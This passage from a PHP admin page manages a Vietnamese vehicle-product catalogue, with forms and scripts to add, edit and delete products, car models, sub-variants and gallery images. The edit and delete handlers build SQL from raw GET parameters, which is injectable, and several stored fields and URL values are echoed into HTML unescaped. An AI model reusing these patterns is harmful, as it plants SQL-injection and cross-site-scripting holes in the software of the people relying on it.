                            <option value="" selected disabled>-- Chọn sản phẩm --</option>
                            <?php foreach ($posts as $post) : ?>
                                <option value="<?php echo htmlspecialchars($post['name']); ?>">
                                    <?php echo htmlspecialchars($post['name']); ?>
                                </option>
                            <?php endforeach; ?>
                        </select>
                    </div>

                    <div id="categoryContainer" style="display:none;">
                        <label class="block text-sm font-medium mb-2 text-white mt-4">Chọn danh mục</label>
                        <select id="categorySelect" name="category" class="w-full border p-3 rounded text-black">
                            <option value="" selected disabled>-- Chọn danh mục --</option>
                        </select>
                    </div>

                    <script>
                        const categories = <?php echo json_encode($categories); ?>;

                        document.getElementById('postSelect').addEventListener('change', function () {
                            const selectedPostName = this.value;
                            const categorySelect = document.getElementById('categorySelect');
                            const categoryContainer = document.getElementById('categoryContainer');

                            categorySelect.innerHTML = '<option value="" selected disabled>-- Chọn danh mục --</option>';

                            if (selectedPostName) {
                                const filteredCategories = categories.filter(cat => cat.post_name === selectedPostName);
                                if (filteredCategories.length > 0) {
                                    categoryContainer.style.display = 'block';
                                    filteredCategories.forEach(cat => {
                                        const option = document.createElement('option');
                                        option.value = cat.name;
                                        option.textContent = cat.name;
                                        categorySelect.appendChild(option);
                                    });
                                } else {
                                    categoryContainer.style.display = 'none';
                                }
                            } else {
                                categoryContainer.style.display = 'none';
                            }
                        });
                    </script>

                    <div>
                        <label class="block text-sm font-medium mb-2 text-white mt-4">Chọn phân loại con</label>
                        <select id="nameSelect" name="name" class="w-full border p-3 rounded text-black">
                            <?php foreach ($arrOptions as $itemOption) : ?>
                                <option value="<?=($itemOption) ?>">
                                    <?=($itemOption) ?>
                                </option>
                            <?php endforeach; ?>
                        </select>
                        <input type="hidden" name="action" value="create-post">
                    </div>
                    <div>
                        <label class="block text-sm font-medium mb-2 text-white">Mô tả chi tiết (nếu có)</label>
                        <textarea name="content" rows="5" class="w-full border p-3 rounded text-black" placeholder="Nhập mô tả chi tiết..."></textarea>
                    </div>

                    <div>
                        <label class="block text-sm font-medium mb-2 text-white">Chính sách bảo hành (nếu có mỗi chính sách 1 dòng)</label>
                        <textarea name="policy" rows="5" class="w-full border p-3 rounded text-black" placeholder="Nhập chính sách bảo hành..."></textarea>
                    </div>

                    <div>
                        <label class="block text-sm font-medium mb-2 text-white">Link video Youtube (nếu có)</label>
                        <input type="url" name="youtube" class="w-full border p-3 rounded text-black" placeholder="Nhập link video..." autocomplete="off">
                    </div>

                    <div>
                        <label class="block text-sm font-medium mb-2 text-white">Link video Tiktok (nếu có)</label>
                        <input type="url" name="tiktok" class="w-full border p-3 rounded text-black" placeholder="Nhập link video..." autocomplete="off">
                    </div>

                    <div>
                        <label class="block text-sm font-medium mb-2 text-white">Danh sách ảnh (nếu có hiển thị trong sản phẩm phân loại con)</label>
                        <input type="file" id="gallery-preview" name="thumbnail[]" accept="image/*" multiple class="w-full border p-3 rounded text-white">
                        <div id="gallery-container" class="grid grid-cols-2 md:grid-cols-4 gap-4 mt-4"></div>
                    </div>

                    <button type="submit" class="w-full bg-cyan-500 hover:bg-cyan-600 text-white font-bold py-3 rounded-lg transition duration-500"><i class="fa fa-plus mr-2"></i> ĐĂNG NGAY</button>
                </form>

                <script>
                    document.getElementById('gallery-preview').addEventListener('change', function() {
                        const container = document.getElementById('gallery-container');
                        container.innerHTML = '';
                        Array.from(this.files).forEach(file => {
                            const reader = new FileReader();
                            reader.onload = function(e) {
                                const imgUrl = e.target.result;
                                const div = document.createElement('div');
                                div.classList.add('relative', 'w-full', 'h-full');
                                div.setAttribute('data-id', imgUrl);
                                
                                const img = document.createElement('img');
                                img.src = imgUrl;
                                img.classList.add('w-full', 'h-full', 'object-cover', 'rounded');
                                
                                const button = document.createElement('button');
                                button.type = 'button';
                                button.classList.add('absolute', 'top-1', 'right-1', 'text-white', 'text-2xl', 'transform', 'transition-transform', 'duration-300', 'hover:rotate-180', 'z-20');
                                button.innerHTML = '<i class="fa fa-close"></i>';
                                button.onclick = function() {
                                    removeImage(imgUrl, file);
                                };
                                
                                div.appendChild(img);
                                div.appendChild(button);

                                container.appendChild(div);
                            };
                            reader.readAsDataURL(file);
                        });
                    });

                    async function removeImage(imgUrl, file) {
                        const imageElement = document.querySelector('[data-id="'+imgUrl+'"]');
                        if (imageElement) {
                            imageElement.remove();
                            const galleryPreviewInput = document.getElementById('gallery-preview');
                            const files = Array.from(galleryPreviewInput.files);
                            const index = files.indexOf(file);
                            if (index !== -1) {
                                files.splice(index, 1);
                            }
                            const dataTransfer = new DataTransfer();
                            files.forEach(f => dataTransfer.items.add(f));
                            galleryPreviewInput.files = dataTransfer.files;
                        } else {
                            Swal.fire({
                                icon: 'error',
                                title: 'Lỗi!',
                                text: 'Không tìm thấy ảnh để xóa.',
                                timer: 1500,
                                showConfirmButton: false,
                                position: "top-end",
                                toast: true
                            });
                        }                        
                    }

                    document.getElementById('product-form').addEventListener('submit', async function (e) {
                        e.preventDefault();

                        const formData = new FormData(this);                

                        const res = await fetch('', { method: 'POST', body: formData });
                        const result = await res.json();
                        Swal.fire({
                            icon: result.status === 'success' ? 'success' : 'error',
                            title: result.status === 'success' ? 'Thành công!' : 'Lỗi!',
                            text: result.message,
                            timer: 1500,
                            showConfirmButton: false,
                            position: "top-end",
                            toast: true
                        })
                        if (result.status === 'success') {
                            setTimeout(() => {
                                location.reload()
                            }, 1000);
                        }
                    });
                </script>
            <?php elseif ($action === 'manager-post' || $action === 'delete-post'): ?>
                <?php if ($action === 'delete-post') {
                    $id = isset($_GET['id']) ? htmlspecialchars($_GET['id'], ENT_QUOTES, 'UTF-8') : null;
                    $sub = isset($_GET['sub']) ? htmlspecialchars($_GET['sub'], ENT_QUOTES, 'UTF-8') : null;
                    if ($id > 0 || $sub > 0) {
                        $query = "DELETE FROM subfolder WHERE id = $sub";
                        $result = mysqli_query($conn, $query);
                        if ($result && mysqli_affected_rows($conn) > 0) {
                            $folder = 'assets/upload/' . $id . '/' . $sub;
                            if (is_dir($folder)) {
                                $files = array_diff(scandir($folder), ['.', '..']);
                                foreach ($files as $file) {
                                    unlink($folder . '/' . $file);
                                }
                                rmdir($folder);
                            }
                            
                            echo '
                            <script>
                                Swal.fire({
                                    icon: "success",
                                    title: "Thành công!",
                                    text: "Xóa sản phẩm thành công",
                                    timer: 1500,
                                    showConfirmButton: false,
                                    position: "top-end",
                                    toast: true
                                })                                  
                            </script>';
                        } elseif ($result && mysqli_affected_rows($conn) == 0) {
                            echo '
                            <script>
                                Swal.fire({
                                    icon: "error",
                                    title: "Lỗi!",
                                    text: "Không tìm thấy sản phẩm với ID này",
                                    timer: 1500,
                                    showConfirmButton: false,
                                    position: "top-end",
                                    toast: true
                                })
                            </script>';                            
                        } else {
                            echo '
                            <script>
                                Swal.fire({
                                    icon: "error",
                                    title: "Lỗi!",
                                    text: "Xảy ra lỗi khi xóa sản phẩm",
                                    timer: 1500,
                                    showConfirmButton: false,
                                    position: "top-end",
                                    toast: true
                                })
                            </script>';
                        }
                    } else {
                        echo '
                        <script>
                            Swal.fire({
                                icon: "error",
                                title: "Lỗi!",
                                text: "ID sản phẩm không hợp lệ",
                                timer: 1500,
                                showConfirmButton: false,
                                position: "top-end",
                                toast: true
                            })
                        </script>';
                    }                
                }?>
                <?php if ($action === 'manager-post' && empty($_GET['open']) && empty($_GET['post'])) { ?>
                <h2 class="text-2xl font-semibold mb-6 text-white uppercase">Danh Sách Sản Phẩm</h2>
                <div class="product-container bg-gray-600 p-3 rounded-2xl mb-8">
                    <label for="newProduct">Thêm mới sản phẩm</label>
                    <div class="relative mt-2">
                        <input type="text" autocomplete="off" id="newProduct" placeholder="Nhập tên sản phẩm tại đây..." class="w-full py-2 pl-4 pr-16 text-black border border-gray-600 rounded-lg focus:outline-none">
                        
                        <div class="absolute inset-y-0 right-0 flex items-center space-x-2 pr-2 pl-3 bg-red-600 p-5 rounded-lg rounded-tl-none rounded-bl-none">                                                         
                            <button onclick="addNewProduct(this)" class="text-yellow-400 hover:text-yellow-500 hover:scale-110 transition duration-300">
                                <i class="fa fa-plus" title="Thêm mới sản phẩm"></i>
                            </button>                                   
                        </div>
                    </div>
                </div>
                <?php 
                $query = "SELECT id, name FROM post";
                $result = mysqli_query($conn, $query);
                while ($row = mysqli_fetch_assoc($result)):
                ?>
                <div class="product-container">
                    <div class="relative">
                        <input type="hidden" name="idPost" value="<?php echo htmlspecialchars($row['id']); ?>">
                        <input type="text" autocomplete="off" placeholder="Nhập tên sản phẩm tại đây..." value="<?php echo htmlspecialchars($row['name']); ?>" 
                            class="w-full py-2 pl-4 pr-16 text-black border border-gray-600 rounded-lg rounded-b-none focus:outline-none">

                        <div class="absolute inset-y-0 right-0 flex items-center space-x-2 pr-2 bg-red-600 p-5 rounded-lg rounded-b-none rounded-tl-none rounded-br-none">
                            <label class="cursor-pointer">
                                <input type="file" accept="image/*" class="hidden file-input" onchange="uploadFile(this)">
                                <i class="fa fa-image text-blue-400 hover:text-blue-500 hover:scale-110 transition duration-300" title="Upload thumbnail"></i>
                            </label>                                 
                            <a href="?action=manager-post&open=category&post=<?php echo htmlspecialchars($row['name']); ?>" 
                                class="text-blue-400 hover:text-blue-500 hover:scale-110 transition duration-300">
                                <i class="fa fa-eye" title="Xem danh mục con"></i>
                            </a>                                    
                            <button onclick="editProduct(this)" 
                                class="text-yellow-400 hover:text-yellow-500 hover:scale-110 transition duration-300">
                                <i class="fa fa-edit" title="Chỉnh sửa tên sản phẩm"></i>
                            </button>
                            <button onclick="deleteProduct(this)" 
                                class="text-red-400 hover:text-red-500 hover:scale-110 transition duration-300"
                                onclick="return confirm('Việc xóa danh mục sản phẩm đồng nghĩa với việc sẽ xóa sạch database liên quan đến sản phẩm này. Bạn có chắc muốn xóa sản phẩm này không?');">
                                <i class="fa fa-trash" title="Xóa sản phẩm"></i>
                            </button>
                        </div>
                    </div>
                    <?php
                    $thumbnailPath = 'assets/upload/' . htmlspecialchars($row['id']) . '/thumbnail.png';
                    if (!file_exists($thumbnailPath)) {
                        $thumbnailPath = 'assets/img/no-picture-taking.png';
                    }
                    ?>
                    <img src="<?php echo $thumbnailPath; ?>" class="thumbnail mb-4 w-full h-full object-cover bg-gray-700 rounded-2xl rounded-t-none bg-[url('assets/img/background.avif')] bg-cover bg-center">
                </div>
                <?php endwhile; ?>
                <script>                   
                async function addNewProduct(element) {
                    const container = element.closest('.product-container');
                    const name = container.querySelector('#newProduct').value;        

                    const formData = new FormData();
                    formData.append('name', name);
                    formData.append('action', 'add-name-post');

                    try {
                        const res = await fetch('', { method: 'POST', body: formData });

                        const result = await res.json();
                        Swal.fire({
                            icon: result.status === 'success' ? 'success' : 'error',
                            title: result.status === 'success' ? 'Thành công!' : 'Lỗi!',
                            text: result.message,
                            timer: 1500,
                            showConfirmButton: false,
                            position: 'top-end',
                            toast: true
                        });
                        if (result.status === 'success') {
                            setTimeout(() => {
                                location.reload()
                            }, 1000);
                        }                          
                    } catch (error) {
                        Swal.fire({
                            icon: 'error',
                            title: 'Lỗi!',
                            text: 'Đã xảy ra lỗi khi thêm sản phẩm mới.',
                            timer: 1500,
                            showConfirmButton: false,
                            position: 'top-end',
                            toast: true
                        });
                    }                    
                }                 
                async function editProduct(element) {
                    const container = element.closest('.product-container');
                    const id = container.querySelector('input[name="idPost"]').value;        
                    const name = container.querySelector('input[type="text"]').value;          
                    const formData = new FormData();
                    formData.append('id', id);
                    formData.append('name', name);
                    formData.append('action', 'edit-name-post');

                    try {
                        const res = await fetch('', { method: 'POST', body: formData });

                        const result = await res.json();
                        Swal.fire({
                            icon: result.status === 'success' ? 'success' : 'error',
                            title: result.status === 'success' ? 'Thành công!' : 'Lỗi!',
                            text: result.message,
                            timer: 1500,
                            showConfirmButton: false,
                            position: 'top-end',
                            toast: true
                        });
                        if (result.status === 'success') {
                            setTimeout(() => {
                                location.reload()
                            }, 1000);
                        }                          
                    } catch (error) {
                        Swal.fire({
                            icon: 'error',
                            title: 'Lỗi!',
                            text: 'Đã xảy ra lỗi khi đổi tên.',
                            timer: 1500,
                            showConfirmButton: false,
                            position: 'top-end',
                            toast: true
                        });
                    }                    
                }                    
                async function deleteProduct(element) {
                    const container = element.closest('.product-container');
                    const id = container.querySelector('input[name="idPost"]').value;         
                    const name = container.querySelector('input[type="text"]').value;          
                    const formData = new FormData();
                    formData.append('id', id);
                    formData.append('name', name);
                    formData.append('action', 'delete-name-post');

                    try {
                        const res = await fetch('', { method: 'POST', body: formData });

                        const result = await res.json();
                        Swal.fire({
                            icon: result.status === 'success' ? 'success' : 'error',
                            title: result.status === 'success' ? 'Thành công!' : 'Lỗi!',
                            text: result.message,
                            timer: 1500,
                            showConfirmButton: false,
                            position: 'top-end',
                            toast: true
                        });
                        if (result.status === 'success') {
                            setTimeout(() => {
                                location.reload()
                            }, 1000);
                        }                          
                    } catch (error) {
                        Swal.fire({
                            icon: 'error',
                            title: 'Lỗi!',
                            text: 'Đã xảy ra lỗi khi xóa.',
                            timer: 1500,
                            showConfirmButton: false,
                            position: 'top-end',
                            toast: true
                        });
                    }                    
                }
                async function uploadFile(inputElement) {
                    const fileInput = inputElement;
                    const container = fileInput.closest('.product-container');
                    const preview = container.querySelector('.thumbnail');
                    const productId = container.querySelector('input[type="hidden"]').value;

                    if (fileInput.files.length > 0 && preview) {
                        const file = fileInput.files[0];

                        const reader = new FileReader();
                        reader.onload = (e) => {
                            preview.src = e.target.result;
                            preview.classList.remove('hidden');
                        };
                        reader.readAsDataURL(file);

                        const formData = new FormData();
                        formData.append('uploaded_file', file);
                        formData.append('product_id', productId);

                        try {
                            const res = await fetch('', { method: 'POST', body: formData });

                            const result = await res.json();
                            Swal.fire({
                                icon: result.status === 'success' ? 'success' : 'error',
                                title: result.status === 'success' ? 'Thành công!' : 'Lỗi!',
                                text: result.message,
                                timer: 1500,
                                showConfirmButton: false,
                                position: 'top-end',
                                toast: true
                            });                          
                        } catch (error) {
                            Swal.fire({
                                icon: 'error',
                                title: 'Lỗi!',
                                text: 'Đã xảy ra lỗi khi tải tệp lên.',
                                timer: 1500,
                                showConfirmButton: false,
                                position: 'top-end',
                                toast: true
                            });
                        }
                    }
                }
                </script>                
                <?php } ?>
                <?php if ($action === 'manager-post' && isset($_GET['open']) && $_GET['open'] === "category") { ?>
                <h2 class="text-2xl font-semibold mb-6 text-white uppercase mt-8">
                    <a href="?action=manager-post"class="text-sm bg-gray-500 text-white pl-2 w-5 h-5 rounded-full shadow hover:bg-gray-600 transition"><i class="fa fa-arrow-left mr-2"></i></a>
                    Danh Sách Đời Xe Của <?php echo htmlspecialchars($_GET['post']); ?>
                </h2>
                <div class="product-container bg-gray-600 p-3 rounded-2xl mb-8">
                    <label for="newCategory">Thêm mới đời xe</label>
                    <div class="relative mt-2">
                        <input type="text" id="newCategory" autocomplete="off" placeholder="Nhập tên đời xe tại đây..." class="w-full py-2 pl-4 pr-16 text-black border border-gray-600 rounded-lg focus:outline-none">
                        <input type="hidden" id="post" autocomplete="off" value="<?=htmlspecialchars($_GET['post'])?>">
                        
                        <div class="absolute inset-y-0 right-0 flex items-center space-x-2 pr-2 pl-3 bg-red-600 p-5 rounded-lg rounded-tl-none rounded-bl-none">                                                         
                            <button onclick="addNewCategory(this)" class="text-yellow-400 hover:text-yellow-500 hover:scale-110 transition duration-300">
                                <i class="fa fa-plus" title="Thêm mới đời xe"></i>
                            </button>                                   
                        </div>
                    </div>
                </div>                    
                <?php 
                $post = mysqli_real_escape_string($conn, $_GET['post']);
                $query = "SELECT id, name FROM category WHERE post = '$post' ORDER BY id";
                $result = mysqli_query($conn, $query);
                while ($row = mysqli_fetch_assoc($result)):
                ?>
                <div class="product-container">
                    <div class="relative mb-4">
                        <input type="hidden" name="idCategory" value="<?php echo htmlspecialchars($row['id']); ?>">
                        <input type="hidden" name="idPost" value="<?php echo htmlspecialchars($post); ?>">
                        <input type="text" autocomplete="off" placeholder="Nhập tên đời xe tại đây..." value="<?php echo htmlspecialchars($row['name']); ?>" 
                            class="w-full py-2 pl-4 pr-16 text-black border border-gray-600 rounded-lg focus:outline-none">

                        <div class="absolute inset-y-0 right-0 flex items-center space-x-2 pr-2 bg-red-600 p-5 rounded-lg rounded-tl-none rounded-bl-none">                          
                            <a href="?action=manager-post&open=subfolder&category=<?php echo htmlspecialchars($row['name']); ?>&post=<?php echo htmlspecialchars($post); ?>" 
                                class="text-blue-400 hover:text-blue-500 hover:scale-110 transition duration-300">
                                <i class="fa fa-eye" title="Xem danh mục con"></i>
                            </a>                                    
                            <button onclick="editProduct(this)" 
                                class="text-yellow-400 hover:text-yellow-500 hover:scale-110 transition duration-300">
                                <i class="fa fa-edit" title="Chỉnh sửa tên danh mục"></i>
                            </button>
                            <button onclick="deleteProduct(this)" 
                                class="text-red-400 hover:text-red-500 hover:scale-110 transition duration-300"
                                onclick="return confirm('Việc xóa danh mục đồng nghĩa với việc sẽ xóa sạch danh mục con liên quan đến danh mục này. Bạn có chắc muốn xóa sản phẩm này không?');">
                                <i class="fa fa-trash" title="Xóa danh mục"></i>
                            </button>
                        </div>
                    </div>
                </div>                
                <?php endwhile; ?>
                <script>
                async function addNewCategory(element) {
                    const container = element.closest('.product-container');
                    const name = container.querySelector('#newCategory').value;        
                    const post = container.querySelector('#post').value;        

                    const formData = new FormData();
                    formData.append('name', name);
                    formData.append('post', post);
                    formData.append('action', 'add-name-category');

                    try {
                        const res = await fetch('', { method: 'POST', body: formData });

                        const result = await res.json();
                        Swal.fire({
                            icon: result.status === 'success' ? 'success' : 'error',
                            title: result.status === 'success' ? 'Thành công!' : 'Lỗi!',
                            text: result.message,
                            timer: 1500,
                            showConfirmButton: false,
                            position: 'top-end',
                            toast: true
                        });
                        if (result.status === 'success') {
                            setTimeout(() => {
                                location.reload()
                            }, 1000);
                        }                          
                    } catch (error) {
                        Swal.fire({
                            icon: 'error',
                            title: 'Lỗi!',
                            text: 'Đã xảy ra lỗi khi thêm sản phẩm mới.',
                            timer: 1500,
                            showConfirmButton: false,
                            position: 'top-end',
                            toast: true
                        });
                    }                    
                }                      
                async function editProduct(element) {
                    const container = element.closest('.product-container');
                    const id = container.querySelector('input[name="idCategory"]').value;        
                    const post = container.querySelector('input[name="idPost"]').value;          
                    const name = container.querySelector('input[type="text"]').value;          
                    const formData = new FormData();
                    formData.append('id', id);
                    formData.append('post', post);
                    formData.append('name', name);
                    formData.append('action', 'edit-name-category');

                    try {
                        const res = await fetch('', { method: 'POST', body: formData });

                        const result = await res.json();
                        Swal.fire({
                            icon: result.status === 'success' ? 'success' : 'error',
                            title: result.status === 'success' ? 'Thành công!' : 'Lỗi!',
                            text: result.message,
                            timer: 1500,
                            showConfirmButton: false,
                            position: 'top-end',
                            toast: true
                        });
                        if (result.status === 'success') {
                            setTimeout(() => {
                                location.reload()
                            }, 1000);
                        }                          
                    } catch (error) {
                        Swal.fire({
                            icon: 'error',
                            title: 'Lỗi!',
                            text: 'Đã xảy ra lỗi khi đổi tên.',
                            timer: 1500,
                            showConfirmButton: false,
                            position: 'top-end',
                            toast: true
                        });
                    }                    
                }                    
                async function deleteProduct(element) {
                    const container = element.closest('.product-container');
                    const id = container.querySelector('input[type="hidden"]').value;        
                    const name = container.querySelector('input[type="text"]').value;          
                    const formData = new FormData();
                    formData.append('id', id);
                    formData.append('name', name);
                    formData.append('action', 'delete-name-category');

                    try {
                        const res = await fetch('', { method: 'POST', body: formData });

                        const result = await res.json();
                        Swal.fire({
                            icon: result.status === 'success' ? 'success' : 'error',
                            title: result.status === 'success' ? 'Thành công!' : 'Lỗi!',
                            text: result.message,
                            timer: 1500,
                            showConfirmButton: false,
                            position: 'top-end',
                            toast: true
                        });
                        if (result.status === 'success') {
                            setTimeout(() => {
                                location.reload()
                            }, 1000);
                        }                          
                    } catch (error) {
                        Swal.fire({
                            icon: 'error',
                            title: 'Lỗi!',
                            text: 'Đã xảy ra lỗi khi xóa.',
                            timer: 1500,
                            showConfirmButton: false,
                            position: 'top-end',
                            toast: true
                        });
                    }                    
                }
                </script>                  
                <?php } ?>
                <?php if ($action === 'manager-post' && isset($_GET['open']) && $_GET['open'] === "subfolder") { ?>
                <h2 class="text-2xl font-semibold mb-6 text-white uppercase mt-8">
                    <a href="?action=manager-post&open=category&post=<?=$_GET['post']?>"class="text-sm bg-gray-500 text-white pl-2 w-5 h-5 rounded-full shadow hover:bg-gray-600 transition"><i class="fa fa-arrow-left mr-2"></i></a>
                    Danh Sách Phân Loại Con Của <?php echo htmlspecialchars($_GET['post']); ?> <?php echo htmlspecialchars($_GET['category']); ?></h2>
                <?php 
                $category = mysqli_real_escape_string($conn, $_GET['category']);
                $post = mysqli_real_escape_string($conn, $_GET['post']);
                $query = "SELECT id, name FROM subfolder WHERE post = '$post' AND category = '$category' ORDER BY id";
                $result = mysqli_query($conn, $query);

                if (mysqli_num_rows($result) < 1) {
                    echo '
                    <script>
                        window.location.href = "?action=post";
                    </script>
                    ';        
                    exit();         
                }

                $stmtID = $conn->prepare("SELECT id FROM post WHERE name = ?");
                $stmtID->bind_param("s", $post);
                $stmtID->execute();
                $stmtID->bind_result($productID);
                $stmtID->fetch();
                $stmtID->close();  

                while ($row = mysqli_fetch_assoc($result)):                            
                ?>              
                <div class="relative mb-4">
                    <input type="text" value="<?php echo htmlspecialchars($row['name']); ?>" readonly 
                        class="w-full py-2 pl-4 pr-16 text-black border border-gray-600 rounded-lg focus:outline-none">

                    <div class="absolute inset-y-0 right-0 flex items-center space-x-2 pr-2 bg-red-600 p-5 rounded-lg rounded-tl-none rounded-bl-none">
                        <a href="view.php?id=<?php echo htmlspecialchars($productID); ?>&sub=<?php echo htmlspecialchars($row['id']); ?>" 
                            class="text-blue-400 hover:text-blue-500 hover:scale-110 transition duration-300">
                            <i class="fa fa-eye"></i>
                        </a>                                            
                        <a href="?action=edit-post&id=<?php echo htmlspecialchars($productID); ?>&sub=<?php echo htmlspecialchars($row['id']); ?>"
                            class="text-yellow-400 hover:text-yellow-500 hover:scale-110 transition duration-300">
                            <i class="fa fa-edit"></i>
                        </a>
                        <a href="?action=delete-post&id=<?php echo $row['id']; ?>" 
                            class="text-red-400 hover:text-red-500 hover:scale-110 transition duration-300"
                            onclick="return confirm('Bạn có chắc muốn xóa đời xe này không?');">
                            <i class="fa fa-trash"></i>
                        </a>
                    </div>
                </div>
                <?php endwhile; ?>
                <?php } ?>
            <?php elseif ($action === 'edit-post'): ?>
                <h2 class="text-2xl font-semibold mb-6 text-white uppercase">Chỉnh Sửa Phân Loại Con</h2>
                <?php
                $id = $_GET['id'] ?? '';
                $sub = $_GET['sub'] ?? '';
                $query = "SELECT * FROM subfolder WHERE id = $sub";
                $result = mysqli_query($conn, $query);
                $post = mysqli_fetch_assoc($result);
                if (mysqli_num_rows($result) < 1) {
                    echo '
                    <script>
                        Swal.fire({
                            icon: "error",
                            title: "Lỗi!",
                            text: "Phân loại không tồn tại",
                            timer: 1500,
                            showConfirmButton: false,
                            position: "top-end",
                            toast: true
                        });
                    </script>
                    ';        
                    exit();         
                }
                $galleryFolder = 'assets/upload/' . $id . '/' . $sub;   
                $policies = explode("\n", $post['policy']);          
                ?>
                <form id="edit-form" class="space-y-6" enctype="multipart/form-data" method="POST" action="?action=update-post&id=<?php echo $id; ?>">
                    
                    <div>
                        <label class="block text-sm font-medium mb-2 text-white mt-4">Chọn phân loại con</label>
                        <select id="nameSelect" name="name" class="w-full border p-3 rounded text-black">
                            <?php foreach ($arrOptions as $itemOption) : ?>
                                <option value="<?= ($itemOption); ?>" <?= ($itemOption==$post['name'])?'selected':'' ?>>
                                    <?= ($itemOption) ?>
                                </option>
                            <?php endforeach; ?>
                        </select>
                        <input type="hidden" name="action" value="edit-post">
                        <input type="hidden" name="id" value="<?php echo $post['id']; ?>">
                        <input type="hidden" name="idPost" value="<?php echo $id; ?>">
                    </div>

                    <div>
                        <label class="block text-sm font-medium mb-2 text-white">Mô tả chi tiết (nếu có)</label>
                        <textarea name="content" rows="5" class="w-full border p-3 rounded text-black" placeholder="Nhập mô tả chi tiết..."><?php echo $post['content']; ?></textarea>
                    </div>

                    <div>
                        <label class="block text-sm font-medium mb-2 text-white">Chính sách bảo hành (nếu có mỗi chính sách 1 dòng)</label>
                        <textarea name="policy" rows="5" class="w-full border p-3 rounded text-black" placeholder="Nhập chính sách bảo hành..."><?php echo $post['policy']; ?></textarea>
                    </div>

                    <div>
                        <label class="block text-sm font-medium mb-2 text-white">Link video Youtube (nếu có)</label>
                        <input type="url" name="youtube" value="<?php echo $post['youtube']; ?>" class="w-full border p-3 rounded text-black" placeholder="Nhập link video..." autocomplete="off">
                    </div>

                    <div>
                        <label class="block text-sm font-medium mb-2 text-white">Link video Tiktok (nếu có)</label>
                        <input type="url" name="tiktok" value="<?php echo $post['tiktok']; ?>" class="w-full border p-3 rounded text-black" placeholder="Nhập link video..." autocomplete="off">
                    </div>

                    <div>
                        <label class="block text-sm font-medium mb-2 text-white">Danh sách ảnh (nếu có hiển thị trong sản phẩm phân loại con)</label>
                        <input type="file" id="gallery-preview" name="thumbnail[]" accept="image/*" multiple class="w-full border p-3 rounded text-white">
                        <div id="gallery-container" class="grid grid-cols-2 md:grid-cols-4 gap-4 mt-4">
                            <?php
                            $galleryPath = 'assets/upload/' . $id . '/' . $sub;
                            if (is_dir($galleryPath)) {
                                $files = scandir($galleryPath);
                                foreach ($files as $img) {
                                    if ($img !== '.' && $img !== '..') {
                                        $imgUrl = $galleryPath . '/' . $img;
                                        echo '<div class="relative w-full h-full" data-id="' . $imgUrl . '">';
                                        echo '<img src="' . $imgUrl . '" class="w-full h-full object-cover rounded">';
                                        echo '<button type="button" class="absolute top-1 right-1 text-white text-2xl transform transition-transform duration-300 hover:rotate-180 z-20" onclick="removeImage(\'' . $imgUrl . '\', \'server\')"><i class="fa fa-close"></i></button>';
                                        echo '</div>';
                                    }
                                }
                            }
                            ?>
                        </div>
                    </div>

                    <button type="submit" class="w-full bg-cyan-500 hover:bg-cyan-600 text-white font-bold py-3 rounded-lg transition duration-500">CẬP NHẬT</button>
                </form>
                <script>
                document.getElementById('gallery-preview').addEventListener('change', function() {
                    const container = document.getElementById('gallery-container');

                    Array.from(this.files).forEach(file => {
                        const reader = new FileReader();
                        
                        reader.onload = function(e) {
                            const imgUrl = e.target.result;
                            const div = document.createElement('div');
                            div.classList.add('relative', 'w-full', 'h-full');
                            div.setAttribute('data-id', imgUrl);
                            
                            const img = document.createElement('img');
                            img.src = imgUrl;
                            img.classList.add('w-full', 'h-full', 'object-cover', 'rounded');
                            
                            const button = document.createElement('button');
                            button.type = 'button';
                            button.classList.add('absolute', 'top-1', 'right-1', 'text-white', 'text-2xl', 'transform', 'transition-transform', 'duration-300', 'hover:rotate-180', 'z-20');
                            button.innerHTML = '<i class="fa fa-close"></i>';
                            button.onclick = function() {
                                removeImage(imgUrl, file);
                            };
                            
                            div.appendChild(img);
                            div.appendChild(button);

                            container.appendChild(div);
                        };
                        
                        reader.readAsDataURL(file);
                    });
                });

                async function removeImage(imageUrl, option) {
                    const imageElement = document.querySelector('[data-id="'+imageUrl+'"]');
                    if (option === "server") {
                        const result = await Swal.fire({
                            title: 'Bạn có chắc chắn muốn xóa ảnh này không?',
                            icon: 'warning',
                            showCancelButton: true,
                            confirmButtonText: 'Có, xóa!',
                            cancelButtonText: 'Hủy',
                            reverseButtons: true
                        });

                        if (result.isConfirmed) {
                            if (imageElement) {
                                const res = await fetch('', {
                                    method: 'POST',
                                    body: new URLSearchParams({
                                        action: 'remove-image',
                                        image: imageUrl
                                    })
                                });
                                const result = await res.json();
                                
                                Swal.fire({
                                    icon: result.success ? 'success' : 'error',
                                    title: result.success ? 'Thành công!' : 'Lỗi!',
                                    text: result.message,
                                    timer: 1500,
                                    showConfirmButton: false,
                                    position: "top-end",
                                    toast: true
                                });

                                if (result.success) {
                                    imageElement.remove();
                                }
                            } else {
                                Swal.fire({
                                    icon: 'error',
                                    title: 'Lỗi!',
                                    text: 'Không tìm thấy ảnh để xóa.',
                                    timer: 1500,
                                    showConfirmButton: false,
                                    position: "top-end",
                                    toast: true
                                });
                            }
                        }
                    } else {
                        if (imageElement) {
                            imageElement.remove();
                            const galleryPreviewInput = document.getElementById('gallery-preview');
                            const files = Array.from(galleryPreviewInput.files);
                            const index = files.indexOf(option);
                            if (index !== -1) {
                                files.splice(index, 1);
                            }
                            const dataTransfer = new DataTransfer();
                            files.forEach(f => dataTransfer.items.add(f));
                            galleryPreviewInput.files = dataTransfer.files;
                        } else {
                            Swal.fire({
                                icon: 'error',
                                title: 'Lỗi!',
                                text: 'Không tìm thấy ảnh để xóa.',
                                timer: 1500,
                                showConfirmButton: false,
                                position: "top-end",
                                toast: true
                            });
                        }                        
                    }
                }

                document.getElementById('edit-form').addEventListener('submit', async function (e) {
                    e.preventDefault();

                    const formData = new FormData(this);

                    const res = await fetch('', { method: 'POST', body: formData });
                    const result = await res.json();
                    Swal.fire({
                        icon: result.status === 'success' ? 'success' : 'error',
                        title: result.status === 'success' ? 'Thành công!' : 'Lỗi!',
                        text: result.message,
                        timer: 1500,
                        showConfirmButton: false,
                        position: "top-end",
                        toast: true
                    })
                    if (result.status === 'success') {
                        setTimeout(() => {
                            location.reload()
                        }, 1000);
                    }                      
                });                
                </script>
            <?php endif; ?>                
        </div>
    </div>
</div>
<?php
require('system/foot.php');
?>
